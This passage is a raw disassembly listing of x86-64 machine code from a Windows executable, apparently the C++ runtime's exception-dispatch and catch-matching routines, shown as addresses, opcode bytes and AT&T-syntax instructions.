   140002b94:	41 83 7e 14 08       	cmpl   $0x8,0x14(%r14)
   140002b99:	0f 85 ab 00 00 00    	jne    0x140002c4a
   140002b9f:	48 39 3e             	cmp    %rdi,(%rsi)
   140002ba2:	0f 84 a2 00 00 00    	je     0x140002c4a
   140002ba8:	48 8b 0e             	mov    (%rsi),%rcx
   140002bab:	49 8d 56 08          	lea    0x8(%r14),%rdx
   140002baf:	e8 d4 f1 ff ff       	call   0x140001d88
   140002bb4:	48 89 06             	mov    %rax,(%rsi)
   140002bb7:	e9 8e 00 00 00       	jmp    0x140002c4a
   140002bbc:	41 39 7e 18          	cmp    %edi,0x18(%r14)
   140002bc0:	74 0f                	je     0x140002bd1
   140002bc2:	49 63 5e 18          	movslq 0x18(%r14),%rbx
   140002bc6:	e8 dd fc ff ff       	call   0x1400028a8
   140002bcb:	48 8d 0c 03          	lea    (%rbx,%rax,1),%rcx
   140002bcf:	eb 05                	jmp    0x140002bd6
   140002bd1:	48 8b cf             	mov    %rdi,%rcx
   140002bd4:	8b df                	mov    %edi,%ebx
   140002bd6:	48 85 c9             	test   %rcx,%rcx
   140002bd9:	75 34                	jne    0x140002c0f
   140002bdb:	49 39 7d 28          	cmp    %rdi,0x28(%r13)
   140002bdf:	0f 84 94 00 00 00    	je     0x140002c79
   140002be5:	48 85 f6             	test   %rsi,%rsi
   140002be8:	0f 84 8b 00 00 00    	je     0x140002c79
   140002bee:	49 63 5e 14          	movslq 0x14(%r14),%rbx
   140002bf2:	49 8d 56 08          	lea    0x8(%r14),%rdx
   140002bf6:	49 8b 4d 28          	mov    0x28(%r13),%rcx
   140002bfa:	e8 89 f1 ff ff       	call   0x140001d88
   140002bff:	48 8b d0             	mov    %rax,%rdx
   140002c02:	4c 8b c3             	mov    %rbx,%r8
   140002c05:	48 8b ce             	mov    %rsi,%rcx
   140002c08:	e8 a3 b5 00 00       	call   0x14000e1b0
   140002c0d:	eb 3b                	jmp    0x140002c4a
   140002c0f:	49 39 7d 28          	cmp    %rdi,0x28(%r13)
   140002c13:	74 69                	je     0x140002c7e
   140002c15:	48 85 f6             	test   %rsi,%rsi
   140002c18:	74 64                	je     0x140002c7e
   140002c1a:	85 db                	test   %ebx,%ebx
   140002c1c:	74 11                	je     0x140002c2f
   140002c1e:	e8 85 fc ff ff       	call   0x1400028a8
   140002c23:	48 8b c8             	mov    %rax,%rcx
   140002c26:	49 63 46 18          	movslq 0x18(%r14),%rax
   140002c2a:	48 03 c8             	add    %rax,%rcx
   140002c2d:	eb 03                	jmp    0x140002c32
   140002c2f:	48 8b cf             	mov    %rdi,%rcx
   140002c32:	48 85 c9             	test   %rcx,%rcx
   140002c35:	74 47                	je     0x140002c7e
   140002c37:	41 8a 06             	mov    (%r14),%al
   140002c3a:	24 04                	and    $0x4,%al
   140002c3c:	f6 d8                	neg    %al
   140002c3e:	1b c9                	sbb    %ecx,%ecx
   140002c40:	f7 d9                	neg    %ecx
   140002c42:	ff c1                	inc    %ecx
   140002c44:	8b f9                	mov    %ecx,%edi
   140002c46:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140002c4a:	8b c7                	mov    %edi,%eax
   140002c4c:	eb 02                	jmp    0x140002c50
   140002c4e:	33 c0                	xor    %eax,%eax
   140002c50:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140002c55:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140002c5a:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   140002c5f:	48 83 c4 30          	add    $0x30,%rsp
   140002c63:	41 5f                	pop    %r15
   140002c65:	41 5e                	pop    %r14
   140002c67:	41 5d                	pop    %r13
   140002c69:	c3                   	ret
   140002c6a:	e8 19 39 00 00       	call   0x140006588
   140002c6f:	e8 14 39 00 00       	call   0x140006588
   140002c74:	e8 0f 39 00 00       	call   0x140006588
   140002c79:	e8 0a 39 00 00       	call   0x140006588
   140002c7e:	e8 05 39 00 00       	call   0x140006588
   140002c83:	90                   	nop
   140002c84:	e8 ff 38 00 00       	call   0x140006588
   140002c89:	90                   	nop
   140002c8a:	cc                   	int3
   140002c8b:	cc                   	int3
   140002c8c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002c91:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002c96:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140002c9b:	41 56                	push   %r14
   140002c9d:	48 83 ec 20          	sub    $0x20,%rsp
   140002ca1:	49 8b f9             	mov    %r9,%rdi
   140002ca4:	4c 8b f1             	mov    %rcx,%r14
   140002ca7:	33 db                	xor    %ebx,%ebx
   140002ca9:	41 39 18             	cmp    %ebx,(%r8)
   140002cac:	7d 05                	jge    0x140002cb3
   140002cae:	48 8b f2             	mov    %rdx,%rsi
   140002cb1:	eb 07                	jmp    0x140002cba
   140002cb3:	49 63 70 08          	movslq 0x8(%r8),%rsi
   140002cb7:	48 03 32             	add    (%rdx),%rsi
   140002cba:	e8 cd fd ff ff       	call   0x140002a8c
   140002cbf:	83 e8 01             	sub    $0x1,%eax
   140002cc2:	74 3c                	je     0x140002d00
   140002cc4:	83 f8 01             	cmp    $0x1,%eax
   140002cc7:	75 67                	jne    0x140002d30
   140002cc9:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   140002ccd:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   140002cd1:	e8 b2 f0 ff ff       	call   0x140001d88
   140002cd6:	4c 8b f0             	mov    %rax,%r14
   140002cd9:	39 5f 18             	cmp    %ebx,0x18(%rdi)
   140002cdc:	74 0c                	je     0x140002cea
   140002cde:	e8 c5 fb ff ff       	call   0x1400028a8
   140002ce3:	48 63 5f 18          	movslq 0x18(%rdi),%rbx
   140002ce7:	48 03 d8             	add    %rax,%rbx
   140002cea:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140002cf0:	4d 8b c6             	mov    %r14,%r8
   140002cf3:	48 8b d3             	mov    %rbx,%rdx
   140002cf6:	48 8b ce             	mov    %rsi,%rcx
   140002cf9:	e8 e2 12 00 00       	call   0x140003fe0
   140002cfe:	eb 30                	jmp    0x140002d30
   140002d00:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   140002d04:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   140002d08:	e8 7b f0 ff ff       	call   0x140001d88
   140002d0d:	4c 8b f0             	mov    %rax,%r14
   140002d10:	39 5f 18             	cmp    %ebx,0x18(%rdi)
   140002d13:	74 0c                	je     0x140002d21
   140002d15:	e8 8e fb ff ff       	call   0x1400028a8
   140002d1a:	48 63 5f 18          	movslq 0x18(%rdi),%rbx
   140002d1e:	48 03 d8             	add    %rax,%rbx
   140002d21:	4d 8b c6             	mov    %r14,%r8
   140002d24:	48 8b d3             	mov    %rbx,%rdx
   140002d27:	48 8b ce             	mov    %rsi,%rcx
   140002d2a:	e8 a5 12 00 00       	call   0x140003fd4
   140002d2f:	90                   	nop
   140002d30:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002d35:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140002d3a:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140002d3f:	48 83 c4 20          	add    $0x20,%rsp
   140002d43:	41 5e                	pop    %r14
   140002d45:	c3                   	ret
   140002d46:	e8 3d 38 00 00       	call   0x140006588
   140002d4b:	90                   	nop
   140002d4c:	48 8b c4             	mov    %rsp,%rax
   140002d4f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140002d53:	4c 89 40 18          	mov    %r8,0x18(%rax)
   140002d57:	55                   	push   %rbp
   140002d58:	56                   	push   %rsi
   140002d59:	57                   	push   %rdi
   140002d5a:	41 54                	push   %r12
   140002d5c:	41 55                	push   %r13
   140002d5e:	41 56                	push   %r14
   140002d60:	41 57                	push   %r15
   140002d62:	48 83 ec 60          	sub    $0x60,%rsp
   140002d66:	4c 8b ac 24 c0 00 00 	mov    0xc0(%rsp),%r13
   140002d6d:	00 
   140002d6e:	4d 8b f9             	mov    %r9,%r15
   140002d71:	4c 8b e2             	mov    %rdx,%r12
   140002d74:	4c 8d 48 10          	lea    0x10(%rax),%r9
   140002d78:	48 8b e9             	mov    %rcx,%rbp
   140002d7b:	4d 8b c5             	mov    %r13,%r8
   140002d7e:	49 8b d7             	mov    %r15,%rdx
   140002d81:	49 8b cc             	mov    %r12,%rcx
   140002d84:	e8 73 f7 ff ff       	call   0x1400024fc
   140002d89:	4c 8b 8c 24 d0 00 00 	mov    0xd0(%rsp),%r9
   140002d90:	00 
   140002d91:	4c 8b f0             	mov    %rax,%r14
   140002d94:	48 8b b4 24 c8 00 00 	mov    0xc8(%rsp),%rsi
   140002d9b:	00 
   140002d9c:	4d 85 c9             	test   %r9,%r9
   140002d9f:	74 0e                	je     0x140002daf
   140002da1:	4c 8b c6             	mov    %rsi,%r8
   140002da4:	48 8b d0             	mov    %rax,%rdx
   140002da7:	48 8b cd             	mov    %rbp,%rcx
   140002daa:	e8 dd fe ff ff       	call   0x140002c8c
   140002daf:	48 8b 8c 24 d8 00 00 	mov    0xd8(%rsp),%rcx
   140002db6:	00 
   140002db7:	8b 59 08             	mov    0x8(%rcx),%ebx
   140002dba:	8b 39                	mov    (%rcx),%edi
   140002dbc:	e8 d3 fa ff ff       	call   0x140002894
   140002dc1:	48 63 4e 0c          	movslq 0xc(%rsi),%rcx
   140002dc5:	4d 8b ce             	mov    %r14,%r9
   140002dc8:	4c 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%r8
   140002dcf:	00 
   140002dd0:	48 03 c1             	add    %rcx,%rax
   140002dd3:	8a 8c 24 f8 00 00 00 	mov    0xf8(%rsp),%cl
   140002dda:	48 8b d5             	mov    %rbp,%rdx
   140002ddd:	88 4c 24 50          	mov    %cl,0x50(%rsp)
   140002de1:	49 8b cc             	mov    %r12,%rcx
   140002de4:	4c 89 7c 24 48       	mov    %r15,0x48(%rsp)
   140002de9:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140002dee:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   140002df2:	89 7c 24 30          	mov    %edi,0x30(%rsp)
   140002df6:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   140002dfb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002e00:	e8 fb f8 ff ff       	call   0x140002700
   140002e05:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   140002e0c:	00 
   140002e0d:	48 83 c4 60          	add    $0x60,%rsp
   140002e11:	41 5f                	pop    %r15
   140002e13:	41 5e                	pop    %r14
   140002e15:	41 5d                	pop    %r13
   140002e17:	41 5c                	pop    %r12
   140002e19:	5f                   	pop    %rdi
   140002e1a:	5e                   	pop    %rsi
   140002e1b:	5d                   	pop    %rbp
   140002e1c:	c3                   	ret
   140002e1d:	cc                   	int3
   140002e1e:	cc                   	int3
   140002e1f:	cc                   	int3
   140002e20:	40 55                	rex push %rbp
   140002e22:	53                   	push   %rbx
   140002e23:	56                   	push   %rsi
   140002e24:	57                   	push   %rdi
   140002e25:	41 54                	push   %r12
   140002e27:	41 55                	push   %r13
   140002e29:	41 56                	push   %r14
   140002e2b:	41 57                	push   %r15
   140002e2d:	48 8d 6c 24 d8       	lea    -0x28(%rsp),%rbp
   140002e32:	48 81 ec 28 01 00 00 	sub    $0x128,%rsp
   140002e39:	48 8b 05 00 62 01 00 	mov    0x16200(%rip),%rax        # 0x140019040
   140002e40:	48 33 c4             	xor    %rsp,%rax
   140002e43:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140002e47:	48 8b bd 90 00 00 00 	mov    0x90(%rbp),%rdi
   140002e4e:	4c 8b e2             	mov    %rdx,%r12
   140002e51:	4c 8b ad a8 00 00 00 	mov    0xa8(%rbp),%r13
   140002e58:	4d 8b f8             	mov    %r8,%r15
   140002e5b:	4c 89 44 24 68       	mov    %r8,0x68(%rsp)
   140002e60:	48 8b d9             	mov    %rcx,%rbx
   140002e63:	48 89 55 80          	mov    %rdx,-0x80(%rbp)
   140002e67:	4c 8b c7             	mov    %rdi,%r8
   140002e6a:	49 8b cc             	mov    %r12,%rcx
   140002e6d:	4c 89 6d 98          	mov    %r13,-0x68(%rbp)
   140002e71:	49 8b d1             	mov    %r9,%rdx
   140002e74:	c6 44 24 60 00       	movb   $0x0,0x60(%rsp)
   140002e79:	49 8b f1             	mov    %r9,%rsi
   140002e7c:	e8 43 0f 00 00       	call   0x140003dc4
   140002e81:	44 8b f0             	mov    %eax,%r14d
   140002e84:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002e87:	0f 8c 5b 04 00 00    	jl     0x1400032e8
   140002e8d:	3b 47 04             	cmp    0x4(%rdi),%eax
   140002e90:	0f 8d 52 04 00 00    	jge    0x1400032e8
   140002e96:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   140002e9c:	0f 85 c9 00 00 00    	jne    0x140002f6b
   140002ea2:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   140002ea6:	0f 85 bf 00 00 00    	jne    0x140002f6b
   140002eac:	8b 43 20             	mov    0x20(%rbx),%eax
   140002eaf:	2d 20 05 93 19       	sub    $0x19930520,%eax
   140002eb4:	83 f8 02             	cmp    $0x2,%eax
   140002eb7:	0f 87 ae 00 00 00    	ja     0x140002f6b
   140002ebd:	48 83 7b 30 00       	cmpq   $0x0,0x30(%rbx)
   140002ec2:	0f 85 a3 00 00 00    	jne    0x140002f6b
   140002ec8:	e8 3f f0 ff ff       	call   0x140001f0c
   140002ecd:	48 83 78 20 00       	cmpq   $0x0,0x20(%rax)
   140002ed2:	0f 84 a9 03 00 00    	je     0x140003281
   140002ed8:	e8 2f f0 ff ff       	call   0x140001f0c
   140002edd:	48 8b 58 20          	mov    0x20(%rax),%rbx
   140002ee1:	e8 26 f0 ff ff       	call   0x140001f0c
   140002ee6:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   140002eea:	c6 44 24 60 01       	movb   $0x1,0x60(%rsp)
   140002eef:	4c 8b 78 28          	mov    0x28(%rax),%r15
   140002ef3:	4c 89 7c 24 68       	mov    %r15,0x68(%rsp)
   140002ef8:	e8 d7 f9 ff ff       	call   0x1400028d4
   140002efd:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   140002f03:	75 1e                	jne    0x140002f23
   140002f05:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   140002f09:	75 18                	jne    0x140002f23
   140002f0b:	8b 43 20             	mov    0x20(%rbx),%eax
   140002f0e:	2d 20 05 93 19       	sub    $0x19930520,%eax
   140002f13:	83 f8 02             	cmp    $0x2,%eax
   140002f16:	77 0b                	ja     0x140002f23
   140002f18:	48 83 7b 30 00       	cmpq   $0x0,0x30(%rbx)
   140002f1d:	0f 84 c5 03 00 00    	je     0x1400032e8
   140002f23:	e8 e4 ef ff ff       	call   0x140001f0c
   140002f28:	48 83 78 38 00       	cmpq   $0x0,0x38(%rax)
   140002f2d:	74 3c                	je     0x140002f6b
   140002f2f:	e8 d8 ef ff ff       	call   0x140001f0c
   140002f34:	4c 8b 78 38          	mov    0x38(%rax),%r15
   140002f38:	e8 cf ef ff ff       	call   0x140001f0c
   140002f3d:	49 8b d7             	mov    %r15,%rdx
   140002f40:	48 8b cb             	mov    %rbx,%rcx
   140002f43:	48 83 60 38 00       	andq   $0x0,0x38(%rax)
   140002f48:	e8 0f 0f 00 00       	call   0x140003e5c
   140002f4d:	84 c0                	test   %al,%al
   140002f4f:	75 15                	jne    0x140002f66
   140002f51:	49 8b cf             	mov    %r15,%rcx
   140002f54:	e8 f3 0f 00 00       	call   0x140003f4c
   140002f59:	84 c0                	test   %al,%al
   140002f5b:	0f 84 64 03 00 00    	je     0x1400032c5
   140002f61:	e9 3b 03 00 00       	jmp    0x1400032a1
   140002f66:	4c 8b 7c 24 68       	mov    0x68(%rsp),%r15
   140002f6b:	48 8b 46 08          	mov    0x8(%rsi),%rax
   140002f6f:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   140002f73:	48 89 7d b8          	mov    %rdi,-0x48(%rbp)
   140002f77:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   140002f7d:	0f 85 b5 02 00 00    	jne    0x140003238
   140002f83:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   140002f87:	0f 85 ab 02 00 00    	jne    0x140003238
   140002f8d:	8b 43 20             	mov    0x20(%rbx),%eax
   140002f90:	2d 20 05 93 19       	sub    $0x19930520,%eax
   140002f95:	83 f8 02             	cmp    $0x2,%eax
   140002f98:	0f 87 9a 02 00 00    	ja     0x140003238
   140002f9e:	45 33 ff             	xor    %r15d,%r15d
   140002fa1:	44 39 7f 0c          	cmp    %r15d,0xc(%rdi)
   140002fa5:	0f 86 be 01 00 00    	jbe    0x140003169
   140002fab:	8b 85 a0 00 00 00    	mov    0xa0(%rbp),%eax
   140002fb1:	48 8d 55 b8          	lea    -0x48(%rbp),%rdx
   140002fb5:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140002fb9:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140002fbd:	4c 8b ce             	mov    %rsi,%r9
   140002fc0:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002fc5:	45 8b c6             	mov    %r14d,%r8d
   140002fc8:	e8 ff f5 ff ff       	call   0x1400025cc
   140002fcd:	0f 10 4d d8          	movups -0x28(%rbp),%xmm1
   140002fd1:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   140002fd5:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   140002fda:	66 0f 7e c0          	movd   %xmm0,%eax
   140002fde:	f3 0f 7f 4d c8       	movdqu %xmm1,-0x38(%rbp)
   140002fe3:	3b 45 f0             	cmp    -0x10(%rbp),%eax
   140002fe6:	0f 83 7d 01 00 00    	jae    0x140003169
   140002fec:	44 8b 65 d0          	mov    -0x30(%rbp),%r12d
   140002ff0:	66 49 0f 7e c9       	movq   %xmm1,%r9
   140002ff5:	4c 89 4c 24 78       	mov    %r9,0x78(%rsp)
   140002ffa:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
   140002ffe:	48 8b 00             	mov    (%rax),%rax
   140003001:	48 63 50 10          	movslq 0x10(%rax),%rdx
   140003005:	41 8b c4             	mov    %r12d,%eax
   140003008:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   14000300c:	49 8b 41 08          	mov    0x8(%r9),%rax
   140003010:	4c 8d 04 8a          	lea    (%rdx,%rcx,4),%r8
   140003014:	41 0f 10 04 00       	movups (%r8,%rax,1),%xmm0
   140003019:	49 63 4c 00 10       	movslq 0x10(%r8,%rax,1),%rcx
   14000301e:	89 4d b0             	mov    %ecx,-0x50(%rbp)
   140003021:	66 0f 7e c0          	movd   %xmm0,%eax
   140003025:	0f 11 45 a0          	movups %xmm0,-0x60(%rbp)
   140003029:	41 3b c6             	cmp    %r14d,%eax
   14000302c:	0f 8f 26 01 00 00    	jg     0x140003158
   140003032:	66 48 0f 7e c0       	movq   %xmm0,%rax
   140003037:	48 c1 e8 20          	shr    $0x20,%rax
   14000303b:	44 3b f0             	cmp    %eax,%r14d
   14000303e:	0f 8f 14 01 00 00    	jg     0x140003158
   140003044:	48 03 4e 08          	add    0x8(%rsi),%rcx
   140003048:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   14000304d:	66 49 0f 7e c5       	movq   %xmm0,%r13
   140003052:	48 89 4d 90          	mov    %rcx,-0x70(%rbp)
   140003056:	49 c1 ed 20          	shr    $0x20,%r13
   14000305a:	45 85 ed             	test   %r13d,%r13d
   14000305d:	0f 84 f2 00 00 00    	je     0x140003155
   140003063:	41 8b c7             	mov    %r15d,%eax
   140003066:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   14000306a:	0f 10 04 81          	movups (%rcx,%rax,4),%xmm0
   14000306e:	0f 11 45 f8          	movups %xmm0,-0x8(%rbp)
   140003072:	8b 44 81 10          	mov    0x10(%rcx,%rax,4),%eax
   140003076:	89 45 08             	mov    %eax,0x8(%rbp)
   140003079:	e8 2a f8 ff ff       	call   0x1400028a8
   14000307e:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   140003082:	48 83 c0 04          	add    $0x4,%rax
   140003086:	48 63 51 0c          	movslq 0xc(%rcx),%rdx
   14000308a:	48 03 c2             	add    %rdx,%rax
   14000308d:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140003092:	e8 11 f8 ff ff       	call   0x1400028a8
   140003097:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   14000309b:	48 63 51 0c          	movslq 0xc(%rcx),%rdx
   14000309f:	8b 0c 10             	mov    (%rax,%rdx,1),%ecx
   1400030a2:	89 4c 24 64          	mov    %ecx,0x64(%rsp)
   1400030a6:	85 c9                	test   %ecx,%ecx
   1400030a8:	7e 3c                	jle    0x1400030e6
   1400030aa:	e8 f9 f7 ff ff       	call   0x1400028a8
   1400030af:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   1400030b4:	4c 8b 43 30          	mov    0x30(%rbx),%r8
   1400030b8:	48 63 09             	movslq (%rcx),%rcx
   1400030bb:	48 03 c1             	add    %rcx,%rax
   1400030be:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   1400030c2:	48 8b d0             	mov    %rax,%rdx
   1400030c5:	48 89 45 88          	mov    %rax,-0x78(%rbp)
   1400030c9:	e8 92 04 00 00       	call   0x140003560
   1400030ce:	85 c0                	test   %eax,%eax
   1400030d0:	75 25                	jne    0x1400030f7
   1400030d2:	8b 44 24 64          	mov    0x64(%rsp),%eax
   1400030d6:	48 83 44 24 70 04    	addq   $0x4,0x70(%rsp)
   1400030dc:	ff c8                	dec    %eax
   1400030de:	89 44 24 64          	mov    %eax,0x64(%rsp)
   1400030e2:	85 c0                	test   %eax,%eax
   1400030e4:	7f c4                	jg     0x1400030aa
   1400030e6:	41 ff c7             	inc    %r15d
   1400030e9:	45 3b fd             	cmp    %r13d,%r15d
   1400030ec:	74 62                	je     0x140003150
   1400030ee:	48 8b 4d 90          	mov    -0x70(%rbp),%rcx
   1400030f2:	e9 6c ff ff ff       	jmp    0x140003063
   1400030f7:	8a 85 98 00 00 00    	mov    0x98(%rbp),%al
   1400030fd:	4c 8b ce             	mov    %rsi,%r9
   140003100:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   140003105:	48 8b cb             	mov    %rbx,%rcx
   140003108:	48 8b 55 80          	mov    -0x80(%rbp),%rdx
   14000310c:	88 44 24 58          	mov    %al,0x58(%rsp)
   140003110:	8a 44 24 60          	mov    0x60(%rsp),%al
   140003114:	88 44 24 50          	mov    %al,0x50(%rsp)
   140003118:	48 8b 45 98          	mov    -0x68(%rbp),%rax
   14000311c:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140003121:	8b 85 a0 00 00 00    	mov    0xa0(%rbp),%eax
   140003127:	89 44 24 40          	mov    %eax,0x40(%rsp)
   14000312b:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
   14000312f:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003134:	48 8b 45 88          	mov    -0x78(%rbp),%rax
   140003138:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000313d:	48 8d 45 f8          	lea    -0x8(%rbp),%rax
   140003141:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003146:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000314b:	e8 fc fb ff ff       	call   0x140002d4c
   140003150:	4c 8b 4c 24 78       	mov    0x78(%rsp),%r9
   140003155:	45 33 ff             	xor    %r15d,%r15d
   140003158:	41 ff c4             	inc    %r12d
   14000315b:	44 3b 65 f0          	cmp    -0x10(%rbp),%r12d
   14000315f:	0f 82 95 fe ff ff    	jb     0x140002ffa
   140003165:	4c 8b 65 80          	mov    -0x80(%rbp),%r12
   140003169:	8b 07                	mov    (%rdi),%eax
   14000316b:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   140003170:	3d 21 05 93 19       	cmp    $0x19930521,%eax
   140003175:	0f 82 fa 00 00 00    	jb     0x140003275
   14000317b:	44 39 7f 20          	cmp    %r15d,0x20(%rdi)
   14000317f:	74 0e                	je     0x14000318f
   140003181:	e8 0e f7 ff ff       	call   0x140002894
   140003186:	48 63 4f 20          	movslq 0x20(%rdi),%rcx
   14000318a:	48 03 c1             	add    %rcx,%rax
   14000318d:	75 21                	jne    0x1400031b0
   14000318f:	8b 47 24             	mov    0x24(%rdi),%eax
   140003192:	c1 e8 02             	shr    $0x2,%eax
   140003195:	a8 01                	test   $0x1,%al
   140003197:	0f 84 d8 00 00 00    	je     0x140003275
   14000319d:	48 8b d7             	mov    %rdi,%rdx
   1400031a0:	48 8b ce             	mov    %rsi,%rcx
   1400031a3:	e8 c4 f2 ff ff       	call   0x14000246c
   1400031a8:	84 c0                	test   %al,%al
   1400031aa:	0f 85 c5 00 00 00    	jne    0x140003275
   1400031b0:	8b 47 24             	mov    0x24(%rdi),%eax
   1400031b3:	c1 e8 02             	shr    $0x2,%eax
   1400031b6:	a8 01                	test   $0x1,%al
   1400031b8:	0f 85 0d 01 00 00    	jne    0x1400032cb
   1400031be:	44 39 7f 20          	cmp    %r15d,0x20(%rdi)
   1400031c2:	74 11                	je     0x1400031d5
   1400031c4:	e8 cb f6 ff ff       	call   0x140002894
   1400031c9:	48 8b d0             	mov    %rax,%rdx
   1400031cc:	48 63 47 20          	movslq 0x20(%rdi),%rax
   1400031d0:	48 03 d0             	add    %rax,%rdx
   1400031d3:	eb 03                	jmp    0x1400031d8
   1400031d5:	49 8b d7             	mov    %r15,%rdx
   1400031d8:	48 8b cb             	mov    %rbx,%rcx
   1400031db:	e8 7c 0c 00 00       	call   0x140003e5c
   1400031e0:	84 c0                	test   %al,%al
   1400031e2:	0f 85 8d 00 00 00    	jne    0x140003275
   1400031e8:	4c 8d 4d 88          	lea    -0x78(%rbp),%r9
   1400031ec:	4c 8b c7             	mov    %rdi,%r8
   1400031ef:	48 8b d6             	mov    %rsi,%rdx
   1400031f2:	49 8b cc             	mov    %r12,%rcx
   1400031f5:	e8 02 f3 ff ff       	call   0x1400024fc
   1400031fa:	8a 8d 98 00 00 00    	mov    0x98(%rbp),%cl
   140003200:	4c 8b c8             	mov    %rax,%r9
   140003203:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   140003208:	48 8b d3             	mov    %rbx,%rdx
   14000320b:	88 4c 24 50          	mov    %cl,0x50(%rsp)
   14000320f:	83 c9 ff             	or     $0xffffffff,%ecx
   140003212:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140003217:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   14000321c:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   140003220:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   140003224:	49 8b cc             	mov    %r12,%rcx
   140003227:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   14000322c:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140003231:	e8 ca f4 ff ff       	call   0x140002700
   140003236:	eb 3d                	jmp    0x140003275
   140003238:	83 7f 0c 00          	cmpl   $0x0,0xc(%rdi)
   14000323c:	76 37                	jbe    0x140003275
   14000323e:	80 bd 98 00 00 00 00 	cmpb   $0x0,0x98(%rbp)
   140003245:	0f 85 9d 00 00 00    	jne    0x1400032e8
   14000324b:	8b 85 a0 00 00 00    	mov    0xa0(%rbp),%eax
   140003251:	4c 8b ce             	mov    %rsi,%r9
   140003254:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   140003259:	4d 8b c7             	mov    %r15,%r8
   14000325c:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140003260:	49 8b d4             	mov    %r12,%rdx
   140003263:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140003268:	48 8b cb             	mov    %rbx,%rcx
   14000326b:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003270:	e8 7b 00 00 00       	call   0x1400032f0
   140003275:	e8 92 ec ff ff       	call   0x140001f0c
   14000327a:	48 83 78 38 00       	cmpq   $0x0,0x38(%rax)
   14000327f:	75 67                	jne    0x1400032e8
   140003281:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   140003285:	48 33 cc             	xor    %rsp,%rcx
   140003288:	e8 03 a8 00 00       	call   0x14000da90
   14000328d:	48 81 c4 28 01 00 00 	add    $0x128,%rsp
   140003294:	41 5f                	pop    %r15
   140003296:	41 5e                	pop    %r14
   140003298:	41 5d                	pop    %r13
   14000329a:	41 5c                	pop    %r12
   14000329c:	5f                   	pop    %rdi
   14000329d:	5e                   	pop    %rsi
   14000329e:	5b                   	pop    %rbx
   14000329f:	5d                   	pop    %rbp
   1400032a0:	c3                   	ret
   1400032a1:	b2 01                	mov    $0x1,%dl
   1400032a3:	48 8b cb             	mov    %rbx,%rcx
   1400032a6:	e8 39 ea ff ff       	call   0x140001ce4
   1400032ab:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   1400032af:	e8 68 06 00 00       	call   0x14000391c
   1400032b4:	48 8d 15 a5 4b 01 00 	lea    0x14ba5(%rip),%rdx        # 0x140017e60
   1400032bb:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   1400032bf:	e8 84 0e 00 00       	call   0x140004148
   1400032c4:	cc                   	int3
   1400032c5:	e8 16 32 00 00       	call   0x1400064e0
   1400032ca:	cc                   	int3
   1400032cb:	e8 3c ec ff ff       	call   0x140001f0c
   1400032d0:	48 89 58 20          	mov    %rbx,0x20(%rax)
   1400032d4:	e8 33 ec ff ff       	call   0x140001f0c
   1400032d9:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
